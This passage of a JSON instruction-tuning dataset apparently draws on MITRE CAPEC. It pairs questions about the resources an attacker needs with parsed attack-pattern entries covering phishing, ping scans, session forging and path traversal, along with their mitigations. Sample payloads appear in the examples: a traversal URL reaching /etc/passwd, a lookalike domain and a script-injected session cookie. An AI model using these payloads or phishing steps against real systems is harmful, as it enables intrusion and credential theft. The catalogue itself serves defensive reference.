            "Design: Proxy communication to host, so that communications are terminated at the proxy, sanitizing the requests before forwarding to server host.",
            "Design: Run server interfaces with a non-root account and/or utilize chroot jails or other configuration techniques to constrain privileges even if attacker gains some limited access to commands.",
            "Implementation: Host integrity monitoring for critical files, directories, and processes. The goal of host integrity monitoring is to be aware when a security issue has occurred so that incident response and other forensic activities can begin.",
            "Implementation: Perform input validation for all remote content, including remote and user-generated content.",
            "Implementation: Perform testing such as pen-testing and vulnerability scanning to identify directories, programs, and interfaces that grant direct access to executables.",
            "Implementation: Use indirect references rather than actual file names.",
            "Implementation: Use possible permissions on file access when developing and deploying web applications.",
            "Implementation: Validate user input by only accepting known good. Ensure all content that is delivered to client is sanitized against an acceptable content specification -- using an allowlist approach."
          ]
        },
        "Example_Instances": {
          "Example": {
            "xhtml:p": [
              "An example of using path traversal to attack some set of resources on a web server is to use a standard HTTP request",
              "From an attacker point of view, this may be sufficient to gain access to the password file on a poorly protected system. If the attacker can list directories of critical resources then read only access is not sufficient to protect the system."
            ],
            "xhtml:div": {
              "@style": "margin-left:1em;",
              "@class": "informative",
              "#text": "http://example/../../../../../etc/passwd"
            }
          }
        },
        "Related_Weaknesses": {
          "Related_Weakness": {
            "@CWE_ID": "22"
          }
        },
        "Taxonomy_Mappings": {
          "Taxonomy_Mapping": [
            {
              "@Taxonomy_Name": "WASC",
              "Entry_ID": "33",
              "Entry_Name": "Path Traversal"
            },
            {
              "@Taxonomy_Name": "OWASP Attacks",
              "Entry_Name": "Path Traversal"
            }
          ]
        },
        "References": {
          "Reference": [
            {
              "@External_Reference_ID": "REF-1"
            },
            {
              "@External_Reference_ID": "REF-9",
              "@Section": "Testing for Path Traversal (OWASP-AZ-001)"
            },
            {
              "@External_Reference_ID": "REF-10",
              "@Section": "WASC-33 - Path Traversal"
            }
          ]
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2014-06-23"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2017-01-09",
              "Modification_Comment": "Updated Activation_Zone, Alternate_Terms, Architectural_Paradigms, Attack_Motivation-Consequences, Attacker_Skills_or_Knowledge_Required, CIA_Impact, Examples-Instances, Frameworks, Injection_Vector, Languages, Payload, Payload_Activation_Impact, Platforms, Purposes, References, Related_Attack_Patterns, Related_Vulnerabilities, Related_Weaknesses, Relevant_Security_Requirements, Solutions_and_Mitigations, Technical_Context, Typical_Likelihood_of_Exploit, Typical_Severity"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2020-07-30",
              "Modification_Comment": "Updated Mitigations"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2020-12-17",
              "Modification_Comment": "Updated References, Taxonomy_Mappings"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2021-06-24",
              "Modification_Comment": "Updated Related_Attack_Patterns"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2021-10-21",
              "Modification_Comment": "Updated Execution_Flow"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2022-09-29",
              "Modification_Comment": "Updated Example_Instances"
            }
          ]
        }
      }
    }
  },
  {
    "instruction": "List the required resources to perform the following capec attack pattern: Phishing (CAPEC ID: 98)",
    "context": "",
    "output": "required resources:\nSome web development tools to put up a fake website.",
    "category": "CAPECFlan",
    "instruction_type": "capec_resources_required",
    "parsed_raw_data": {
      "Resources_Required": "Some web development tools to put up a fake website.",
      "@Name": "Phishing (CAPEC ID: 98)",
      "attack_ptrn": {
        "@ID": "98",
        "@Name": "Phishing",
        "@Abstraction": "Standard",
        "@Status": "Draft",
        "Description": "Phishing is a social engineering technique where an attacker masquerades as a legitimate entity with which the victim might do business in order to prompt the user to reveal some confidential information (very frequently authentication credentials) that can later be used by an attacker. Phishing is essentially a form of information gathering or \"fishing\" for information.",
        "Likelihood_Of_Attack": "High",
        "Typical_Severity": "Very High",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": [
            {
              "@Nature": "ChildOf",
              "@CAPEC_ID": "151",
              "Exclude_Related": [
                {
                  "@Exclude_ID": "515"
                },
                {
                  "@Exclude_ID": "512"
                },
                {
                  "@Exclude_ID": "513"
                }
              ]
            },
            {
              "@Nature": "CanPrecede",
              "@CAPEC_ID": "89"
            },
            {
              "@Nature": "CanPrecede",
              "@CAPEC_ID": "543"
            },
            {
              "@Nature": "CanPrecede",
              "@CAPEC_ID": "611"
            },
            {
              "@Nature": "CanPrecede",
              "@CAPEC_ID": "630"
            },
            {
              "@Nature": "CanPrecede",
              "@CAPEC_ID": "631"
            },
            {
              "@Nature": "CanPrecede",
              "@CAPEC_ID": "632"
            }
          ]
        },
        "Execution_Flow": {
          "Attack_Step": [
            {
              "Step": "1",
              "Phase": "Explore",
              "Description": "[Obtain domain name and certificate to spoof legitimate site] This optional step can be used to help the attacker impersonate the legitimate site more convincingly. The attacker can use homograph attacks to convince users that they are using the legitimate website. Note that this step is not required for phishing attacks, and many phishing attacks simply supply URLs containing an IP address and no SSL certificate.",
              "Technique": [
                "Optionally obtain a domain name that visually looks similar to the legitimate site's domain name. An example is www.paypaI.com vs. www.paypal.com (the first one contains a capital i, instead of a lower case L)",
                "Optionally obtain a legitimate SSL certificate for the new domain name."
              ]
            },
            {
              "Step": "2",
              "Phase": "Explore",
              "Description": "[Explore legitimate website and create duplicate] An attacker creates a website (optionally at a URL that looks similar to the original URL) that closely resembles the website that they are trying to impersonate. That website will typically have a login form for the victim to put in their authentication credentials. There can be different variations on a theme here.",
              "Technique": [
                "Use spidering software to get copy of web pages on legitimate site.",
                "Manually save copies of required web pages from legitimate site.",
                "Create new web pages that have the legitimate site's look and feel, but contain completely new content."
              ]
            },
            {
              "Step": "3",
              "Phase": "Exploit",
              "Description": "[Convince user to enter sensitive information on attacker's site.] An attacker sends an e-mail to the victim that has some sort of a call to action to get the user to click on the link included in the e-mail (which takes the victim to attacker's website) and log in. The key is to get the victim to believe that the e-mail is coming from a legitimate entity with which the victim does business and that the website pointed to by the URL in the e-mail is the legitimate website. A call to action will usually need to sound legitimate and urgent enough to prompt action from the user.",
              "Technique": [
                "Send the user a message from a spoofed legitimate-looking e-mail address that asks the user to click on the included link.",
                "Place phishing link in post to online forum."
              ]
            },
            {
              "Step": "4",
              "Phase": "Exploit",
              "Description": "[Use stolen credentials to log into legitimate site] Once the attacker captures some sensitive information through phishing (login credentials, credit card information, etc.) the attacker can leverage this information. For instance, the attacker can use the victim's login credentials to log into their bank account and transfer money to an account of their choice.",
              "Technique": "Log in to the legitimate site using another user's supplied credentials"
            }
          ]
        },
        "Prerequisites": {
          "Prerequisite": [
            "An attacker needs to have a way to initiate contact with the victim. Typically that will happen through e-mail.",
            "An attacker needs to correctly guess the entity with which the victim does business and impersonate it. Most of the time phishers just use the most popular banks/services and send out their \"hooks\" to many potential victims.",
            "An attacker needs to have a sufficiently compelling call to action to prompt the user to take action.",
            "The replicated website needs to look extremely similar to the original website and the URL used to get to that website needs to look like the real URL of the said business entity."
          ]
        },
        "Skills_Required": {
          "Skill": {
            "@Level": "Medium",
            "#text": "Basic knowledge about websites: obtaining them, designing and implementing them, etc."
          }
        },
        "Resources_Required": {
          "Resource": "Some web development tools to put up a fake website."
        },
        "Indicators": {
          "Indicator": [
            "You receive an e-mail from an entity that you are not even a customer of prompting you to log into your account.",
            "You receive any e-mail that provides you with a link which takes you to a website on which you need to enter your log in information."
          ]
        },
        "Consequences": {
          "Consequence": [
            {
              "Scope": [
                "Confidentiality",
                "Access Control",
                "Authorization"
              ],
              "Impact": "Gain Privileges"
            },
            {
              "Scope": "Confidentiality",
              "Impact": "Read Data"
            },
            {
              "Scope": "Integrity",
              "Impact": "Modify Data"
            }
          ]
        },
        "Mitigations": {
          "Mitigation": "Do not follow any links that you receive within your e-mails and certainly do not input any login credentials on the page that they take you too. Instead, call your Bank, PayPal, eBay, etc., and inquire about the problem. A safe practice would also be to type the URL of your bank in the browser directly and only then log in. Also, never reply to any e-mails that ask you to provide sensitive information of any kind."
        },
        "Example_Instances": {
          "Example": [
            "The target gets an official looking e-mail from their bank stating that their account has been temporarily locked due to suspected unauthorized activity and that they need to click on the link included in the e-mail to log in to their bank account in order to unlock it. The link in the e-mail looks very similar to that of their bank and once the link is clicked, the log in page is the exact replica. The target supplies their login credentials after which they are notified that their account has now been unlocked and that everything is fine. An attacker has just collected the target's online banking information which can now be used by the attacker to log into the target's bank account and transfer money to a bank account of the attackers' choice.",
            "An adversary may use BlueJacking, or Bluetooth Phishing to send unsolicited contact cards, messages, or pictures to nearby devices that are listening via Bluetooth. These messages may contain phishing content."
          ]
        },
        "Related_Weaknesses": {
          "Related_Weakness": {
            "@CWE_ID": "451"
          }
        },
        "Taxonomy_Mappings": {
          "Taxonomy_Mapping": [
            {
              "@Taxonomy_Name": "ATTACK",
              "Entry_ID": "1566",
              "Entry_Name": "Phishing"
            },
            {
              "@Taxonomy_Name": "ATTACK",
              "Entry_ID": "1598",
              "Entry_Name": "Phishing for Information"
            }
          ]
        },
        "References": {
          "Reference": {
            "@External_Reference_ID": "REF-656"
          }
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2014-06-23"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2018-07-31",
              "Modification_Comment": "Updated Attacker_Skills_or_Knowledge_Required"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2019-04-04",
              "Modification_Comment": "Updated Related_Attack_Patterns"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2020-07-30",
              "Modification_Comment": "Updated Example_Instances, Execution_Flow, Taxonomy_Mappings"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2020-12-17",
              "Modification_Comment": "Updated Example_Instances, Execution_Flow"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2021-06-24",
              "Modification_Comment": "Updated Example_Instances, References"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2022-09-29",
              "Modification_Comment": "Updated Related_Attack_Patterns, Taxonomy_Mappings"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2023-01-24",
              "Modification_Comment": "Updated Related_Weaknesses"
            }
          ]
        }
      }
    }
  },
  {
    "instruction": "Provide the resources needed so the attacker can use the attack pattern: ICMP Echo Request Ping (CAPEC ID: 285)",
    "context": "",
    "output": "Here is the list of resources required to implement attack pattern ICMP Echo Request Ping (CAPEC ID: 285):\nScanners or utilities that provide the ability to send custom ICMP queries.",
    "category": "CAPECFlan",
    "instruction_type": "capec_resources_required",
    "parsed_raw_data": {
      "Resources_Required": "Scanners or utilities that provide the ability to send custom ICMP queries.",
      "@Name": "ICMP Echo Request Ping (CAPEC ID: 285)",
      "attack_ptrn": {
        "@ID": "285",
        "@Name": "ICMP Echo Request Ping",
        "@Abstraction": "Detailed",
        "@Status": "Stable",
        "Description": "An adversary sends out an ICMP Type 8 Echo Request, commonly known as a 'Ping', in order to determine if a target system is responsive. If the request is not blocked by a firewall or ACL, the target host will respond with an ICMP Type 0 Echo Reply datagram. This type of exchange is usually referred to as a 'Ping' due to the Ping utility present in almost all operating systems. Ping, as commonly implemented, allows a user to test for alive hosts, measure round-trip time, and measure the percentage of packet loss.",
        "Extended_Description": {
          "xhtml:p": "Performing this operation for a range of hosts on the network is known as a 'Ping Sweep'. While the Ping utility is useful for small-scale host discovery, it was not designed for rapid or efficient host discovery over large network blocks. Other scanning utilities have been created that make ICMP ping sweeps easier to perform. Most networks filter ingress ICMP Type 8 messages for security reasons. Various other methods of performing ping sweeps have developed as a result. It is important to recognize the key security goal of the adversary is to discover if an IP address is alive, or has a responsive host. To this end, virtually any type of ICMP message, as defined by RFC 792 is useful. An adversary can cycle through various types of ICMP messages to determine if holes exist in the firewall configuration. When ICMP ping sweeps fail to discover hosts, other protocols can be used for the same purpose, such as TCP SYN or ACK segments, UDP datagrams sent to closed ports, etc."
        },
        "Likelihood_Of_Attack": "Medium",
        "Typical_Severity": "Low",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": {
            "@Nature": "ChildOf",
            "@CAPEC_ID": "292",
            "Exclude_Related": {
              "@Exclude_ID": "512"
            }
          }
        },
        "Prerequisites": {
          "Prerequisite": "The ability to send an ICMP type 8 query (Echo Request) to a remote target and receive an ICMP type 0 message (ICMP Echo Reply) in response. Any firewalls or access control lists between the sender and receiver must allow ICMP Type 8 and ICMP Type 0 messages in order for a ping operation to succeed."
        },
        "Skills_Required": {
          "Skill": {
            "@Level": "Low",
            "#text": "The adversary needs to know certain linux commands for this type of attack."
          }
        },
        "Resources_Required": {
          "Resource": "Scanners or utilities that provide the ability to send custom ICMP queries."
        },
        "Consequences": {
          "Consequence": {
            "Scope": "Confidentiality",
            "Impact": "Other",
            "Note": "A successful attack of this kind can identify open ports and available services on a system."
          }
        },
        "Mitigations": {
          "Mitigation": "Consider configuring firewall rules to block ICMP Echo requests and prevent replies. If not practical, monitor and consider action when a system has fast and a repeated pattern of requests that move incrementally through port numbers."
        },
        "Related_Weaknesses": {
          "Related_Weakness": {
            "@CWE_ID": "200"
          }
        },
        "References": {
          "Reference": [
            {
              "@External_Reference_ID": "REF-33",
              "@Section": "Chapter 2: Scanning, pp. 44-51"
            },
            {
              "@External_Reference_ID": "REF-123"
            },
            {
              "@External_Reference_ID": "REF-124"
            },
            {
              "@External_Reference_ID": "REF-125"
            },
            {
              "@External_Reference_ID": "REF-34",
              "@Section": "Section 3.5.2 Ping Scan (-SP), pg. 58"
            }
          ]
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2014-06-23"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2017-08-04",
              "Modification_Comment": "Updated Description Summary, Resources_Required"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2018-07-31",
              "Modification_Comment": "Updated Attack_Motivation-Consequences, Attacker_Skills_or_Knowledge_Required, Description, Description Summary, Related_Weaknesses, Solutions_and_Mitigations, Typical_Likelihood_of_Exploit"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2019-09-30",
              "Modification_Comment": "Updated Related_Attack_Patterns"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2022-02-22",
              "Modification_Comment": "Updated Description, Extended_Description"
            }
          ]
        }
      }
    }
  },
  {
    "instruction": "What are the required resources to execute the attack pattern: Transaction or Event Tampering via Application API Manipulation (CAPEC ID: 385)",
    "context": "",
    "output": "The resources required to execute Transaction or Event Tampering via Application API Manipulation (CAPEC ID: 385) are the following: A software program that allows the use of adversary-in-the-middle communications (CAPEC-94) between the client and server, such as a man-in-the-middle proxy.",
    "category": "CAPECFlan",
    "instruction_type": "capec_resources_required",
    "parsed_raw_data": {
      "Resources_Required": "A software program that allows the use of adversary-in-the-middle communications (CAPEC-94) between the client and server, such as a man-in-the-middle proxy.",
      "@Name": "Transaction or Event Tampering via Application API Manipulation (CAPEC ID: 385)",
      "attack_ptrn": {
        "@ID": "385",
        "@Name": "Transaction or Event Tampering via Application API Manipulation",
        "@Abstraction": "Detailed",
        "@Status": "Draft",
        "Description": "An attacker hosts or joins an event or transaction within an application framework in order to change the content of messages or items that are being exchanged. Performing this attack allows the attacker to manipulate content in such a way as to produce messages or content that look authentic but may contain deceptive links, substitute one item or another, spoof an existing item and conduct a false exchange, or otherwise change the amounts or identity of what is being exchanged. The techniques require use of specialized software that allow the attacker to man-in-the-middle communications between the web browser and the remote system in order to change the content of various application elements. Often, items exchanged in game can be monetized via sales for coin, virtual dollars, etc. The purpose of the attack is for the attack to scam the victim by trapping the data packets involved the exchange and altering the integrity of the transfer process.",
        "Typical_Severity": "Medium",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": {
            "@Nature": "ChildOf",
            "@CAPEC_ID": "384"
          }
        },
        "Prerequisites": {
          "Prerequisite": "Targeted software is utilizing application framework APIs"
        },
        "Resources_Required": {
          "Resource": "A software program that allows the use of adversary-in-the-middle communications (CAPEC-94) between the client and server, such as a man-in-the-middle proxy."
        },
        "Related_Weaknesses": {
          "Related_Weakness": [
            {
              "@CWE_ID": "471"
            },
            {
              "@CWE_ID": "345"
            },
            {
              "@CWE_ID": "346"
            },
            {
              "@CWE_ID": "602"
            },
            {
              "@CWE_ID": "311"
            }
          ]
        },
        "References": {
          "Reference": {
            "@External_Reference_ID": "REF-327"
          }
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2014-06-23"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2019-09-30",
              "Modification_Comment": "Updated @Abstraction"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2021-06-24",
              "Modification_Comment": "Updated Resources_Required"
            }
          ]
        }
      }
    }
  },
  {
    "instruction": "What are the required resources to execute the attack pattern: Infrastructure Manipulation (CAPEC ID: 161)",
    "context": "",
    "output": "The resources required to execute Infrastructure Manipulation (CAPEC ID: 161) are the following: The attacker must be able to corrupt the infrastructure used by the client. For some variants of this attack, the attacker must be able to stand up their own services that mimic the services the targeted client intends to use.",
    "category": "CAPECFlan",
    "instruction_type": "capec_resources_required",
    "parsed_raw_data": {
      "Resources_Required": "The attacker must be able to corrupt the infrastructure used by the client. For some variants of this attack, the attacker must be able to stand up their own services that mimic the services the targeted client intends to use.",
      "@Name": "Infrastructure Manipulation (CAPEC ID: 161)",
      "attack_ptrn": {
        "@ID": "161",
        "@Name": "Infrastructure Manipulation",
        "@Abstraction": "Meta",
        "@Status": "Draft",
        "Description": "An attacker exploits characteristics of the infrastructure of a network entity in order to perpetrate attacks or information gathering on network objects or effect a change in the ordinary information flow between network objects. Most often, this involves manipulation of the routing of network messages so, instead of arriving at their proper destination, they are directed towards an entity of the attackers' choosing, usually a server controlled by the attacker. The victim is often unaware that their messages are not being processed correctly. For example, a targeted client may believe they are connecting to their own bank but, in fact, be connecting to a Pharming site controlled by the attacker which then collects the user's login information in order to hijack the actual bank account.",
        "Typical_Severity": "High",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": {
            "@Nature": "CanPrecede",
            "@CAPEC_ID": "664"
          }
        },
        "Prerequisites": {
          "Prerequisite": "The targeted client must access the site via infrastructure that the attacker has co-opted and must fail to adequately verify that the communication channel is operating correctly (e.g. by verifying that they are, in fact, connected to the site they intended.)"
        },
        "Resources_Required": {
          "Resource": "The attacker must be able to corrupt the infrastructure used by the client. For some variants of this attack, the attacker must be able to stand up their own services that mimic the services the targeted client intends to use."
        },
        "Related_Weaknesses": {
          "Related_Weakness": {
            "@CWE_ID": "923"
          }
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2014-06-23"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2017-01-09",
              "Modification_Comment": "Updated Related_Attack_Patterns"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2021-06-24",
              "Modification_Comment": "Updated Related_Attack_Patterns"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2023-01-24",
              "Modification_Comment": "Updated Related_Weaknesses"
            }
          ]
        }
      }
    }
  },
  {
    "instruction": "Provide the resources needed so the attacker can use the attack pattern: Session Credential Falsification through Forging (CAPEC ID: 196)",
    "context": "",
    "output": "Here is the list of resources required to implement attack pattern Session Credential Falsification through Forging (CAPEC ID: 196):\nAttackers may require tools to craft messages containing their forged credentials, and ability to send HTTP request to a web application.",
    "category": "CAPECFlan",
    "instruction_type": "capec_resources_required",
    "parsed_raw_data": {
      "Resources_Required": "Attackers may require tools to craft messages containing their forged credentials, and ability to send HTTP request to a web application.",
      "@Name": "Session Credential Falsification through Forging (CAPEC ID: 196)",
      "attack_ptrn": {
        "@ID": "196",
        "@Name": "Session Credential Falsification through Forging",
        "@Abstraction": "Standard",
        "@Status": "Draft",
        "Description": "An attacker creates a false but functional session credential in order to gain or usurp access to a service. Session credentials allow users to identify themselves to a service after an initial authentication without needing to resend the authentication information (usually a username and password) with every message. If an attacker is able to forge valid session credentials they may be able to bypass authentication or piggy-back off some other authenticated user's session. This attack differs from Reuse of Session IDs and Session Sidejacking attacks in that in the latter attacks an attacker uses a previous or existing credential without modification while, in a forging attack, the attacker must create their own credential, although it may be based on previously observed credentials.",
        "Likelihood_Of_Attack": "Medium",
        "Typical_Severity": "Medium",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": [
            {
              "@Nature": "CanPrecede",
              "@CAPEC_ID": "384"
            },
            {
              "@Nature": "CanPrecede",
              "@CAPEC_ID": "61"
            },
            {
              "@Nature": "ChildOf",
              "@CAPEC_ID": "21"
            }
          ]
        },
        "Execution_Flow": {
          "Attack_Step": [
            {
              "Step": "1",
              "Phase": "Explore",
              "Description": "[Analyze and Understand Session IDs] The attacker finds that the targeted application use session credentials to identify legitimate users.",
              "Technique": [
                "An attacker makes many anonymous connections and records the session IDs.",
                "An attacker makes authorized connections and records the session tokens or credentials."
              ]
            },
            {
              "Step": "2",
              "Phase": "Experiment",
              "Description": "[Create Session IDs.] Attackers craft messages containing their forged credentials in GET, POST request, HTTP headers or cookies.",
              "Technique": "The attacker manipulates the HTTP request message and adds their forged session IDs in to the requests or cookies."
            },
            {
              "Step": "3",
              "Phase": "Exploit",
              "Description": "[Abuse the Victim's Session Credentials] The attacker fixates falsified session ID to the victim when victim access the system. Once the victim has achieved a higher level of privilege, possibly by logging into the application, the attacker can now take over the session using the forged session identifier.",
              "Technique": [
                "The attacker loads the predefined or predicted session ID into their browser and browses to protected data or functionality.",
                "The attacker loads the predefined or predicted session ID into their software and utilizes functionality with the rights of the victim."
              ]
            }
          ]
        },
        "Prerequisites": {
          "Prerequisite": "The targeted application must use session credentials to identify legitimate users. Session identifiers that remains unchanged when the privilege levels change. Predictable session identifiers."
        },
        "Skills_Required": {
          "Skill": {
            "@Level": "Medium",
            "#text": "Forge the session credential and reply the request."
          }
        },
        "Resources_Required": {
          "Resource": "Attackers may require tools to craft messages containing their forged credentials, and ability to send HTTP request to a web application."
        },
        "Consequences": {
          "Consequence": [
            {
              "Scope": "Integrity",
              "Impact": "Modify Data"
            },
            {
              "Scope": "Confidentiality",
              "Impact": "Read Data"
            },
            {
              "Scope": "Authorization",
              "Impact": "Execute Unauthorized Commands",
              "Note": "Run Arbitrary Code"
            },
            {
              "Scope": [
                "Accountability",
                "Authentication",
                "Authorization",
                "Non-Repudiation"
              ],
              "Impact": "Gain Privileges"
            },
            {
              "Scope": [
                "Access Control",
                "Authorization"
              ],
              "Impact": "Bypass Protection Mechanism"
            }
          ]
        },
        "Mitigations": {
          "Mitigation": [
            "Implementation: Use session IDs that are difficult to guess or brute-force: One way for the attackers to obtain valid session IDs is by brute-forcing or guessing them. By choosing session identifiers that are sufficiently random, brute-forcing or guessing becomes very difficult.",
            "Implementation: Regenerate and destroy session identifiers when there is a change in the level of privilege: This ensures that even though a potential victim may have followed a link with a fixated identifier, a new one is issued when the level of privilege changes."
          ]
        },
        "Example_Instances": {
          "Example": {
            "xhtml:p": [
              "This example uses client side scripting to set session ID in the victim's browser. The JavaScript code",
              "fixates a falsified session credential into victim's browser, with the help of crafted a URL link.",
              "A similar example uses session ID as an argument of the URL.",
              "Once the victim clicks the links, the attacker may be able to bypass authentication or piggy-back off some other authenticated victim's session."
            ],
            "xhtml:div": [
              {
                "@style": "margin-left:1em;",
                "@class": "informative",
                "#text": "document.cookie=\"sessionid=0123456789\""
              },
              {
                "@style": "margin-left:1em;",
                "@class": "informative",
                "#text": "http://www.example.com/<script>document.cookie=\"sessionid=0123456789\";</script>"
              },
              {
                "@style": "margin-left:1em;",
                "@class": "informative",
                "#text": "http://www.example.com/index.php/sessionid=0123456789"
              }
            ]
          }
        },
        "Related_Weaknesses": {
          "Related_Weakness": [
            {
              "@CWE_ID": "384"
            },
            {
              "@CWE_ID": "664"
            }
          ]
        },
        "Taxonomy_Mappings": {
          "Taxonomy_Mapping": [
            {
              "@Taxonomy_Name": "ATTACK",
              "Entry_ID": "1134.002",
              "Entry_Name": "Access Token Manipulation: Create Process with Token"
            },
            {
              "@Taxonomy_Name": "ATTACK",
              "Entry_ID": "1134.003",
              "Entry_Name": "Access Token Manipulation: Make and Impersonate Token"
            },
            {
              "@Taxonomy_Name": "ATTACK",
              "Entry_ID": "1606",
              "Entry_Name": "Forge Web Credentials"
            }
          ]
        },
        "References": {
          "Reference": [
            {
              "@External_Reference_ID": "REF-62"
            },
            {
              "@External_Reference_ID": "REF-63",
              "@Section": "Testing for Session Management"
            }
          ]
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2014-06-23"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2018-07-31",
              "Modification_Comment": "Updated References"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2019-04-04",
              "Modification_Comment": "Updated Consequences, Related_Attack_Patterns, Related_Weaknesses"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2020-07-30",
              "Modification_Comment": "Updated Execution_Flow"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2022-09-29",
              "Modification_Comment": "Updated Example_Instances, Taxonomy_Mappings"
            }
          ]
        }
      }
    }
  },
  {
    "instruction": "Given the attack pattern: UDP Ping (CAPEC ID: 298), tell me required resources from an attacker",
    "context": "",
    "output": "Sure. Here are the required resources the attacker should have:\nUDP pings can be performed via the use of a port scanner or by raw socket manipulation using a scripting or programming language. Packet injection tools are also useful for this purpose. Depending upon the technique used it may also be necessary to sniff the network in order to see the response.",
    "category": "CAPECFlan",
    "instruction_type": "capec_resources_required",
    "parsed_raw_data": {
      "Resources_Required": "UDP pings can be performed via the use of a port scanner or by raw socket manipulation using a scripting or programming language. Packet injection tools are also useful for this purpose. Depending upon the technique used it may also be necessary to sniff the network in order to see the response.",
      "@Name": "UDP Ping (CAPEC ID: 298)",
      "attack_ptrn": {
        "@ID": "298",
        "@Name": "UDP Ping",
        "@Abstraction": "Detailed",
        "@Status": "Stable",
        "Description": "An adversary sends a UDP datagram to the remote host to determine if the host is alive. If a UDP datagram is sent to an open UDP port there is very often no response, so a typical strategy for using a UDP ping is to send the datagram to a random high port on the target. The goal is to solicit an 'ICMP port unreachable' message from the target, indicating that the host is alive. UDP pings are useful because some firewalls are not configured to block UDP datagrams sent to strange or typically unused ports, like ports in the 65K range. Additionally, while some firewalls may filter incoming ICMP, weaknesses in firewall rule-sets may allow certain types of ICMP (host unreachable, port unreachable) which are useful for UDP ping attempts.",
        "Typical_Severity": "Low",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": {
            "@Nature": "ChildOf",
            "@CAPEC_ID": "292",
            "Exclude_Related": {
              "@Exclude_ID": "512"
            }
          }
        },
        "Prerequisites": {
          "Prerequisite": [
            "The adversary requires the ability to send a UDP datagram to a remote host and receive a response.",
            "The adversary requires the ability to craft custom UDP Packets for use during network reconnaissance.",
            "The target's firewall must not be configured to block egress ICMP messages."
          ]
        },
        "Resources_Required": {
          "Resource": "UDP pings can be performed via the use of a port scanner or by raw socket manipulation using a scripting or programming language. Packet injection tools are also useful for this purpose. Depending upon the technique used it may also be necessary to sniff the network in order to see the response."
        },
        "Consequences": {
          "Consequence": [
            {
              "Scope": "Confidentiality",
              "Impact": "Other"
            },
            {
              "Scope": [
                "Confidentiality",
                "Access Control",
                "Authorization"
              ],
              "Impact": [
                "Bypass Protection Mechanism",
                "Hide Activities"
              ]
            }
          ]
        },
        "Mitigations": {
          "Mitigation": "Configure your firewall to block egress ICMP messages."
        },
        "Related_Weaknesses": {
          "Related_Weakness": {
            "@CWE_ID": "200"
          }
        },
        "References": {
          "Reference": [
            {
              "@External_Reference_ID": "REF-33",
              "@Section": "Chapter 2: Scanning, pg. 47"
            },
            {
              "@External_Reference_ID": "REF-158"
            },
            {
              "@External_Reference_ID": "REF-125"
            },
            {
              "@External_Reference_ID": "REF-34",
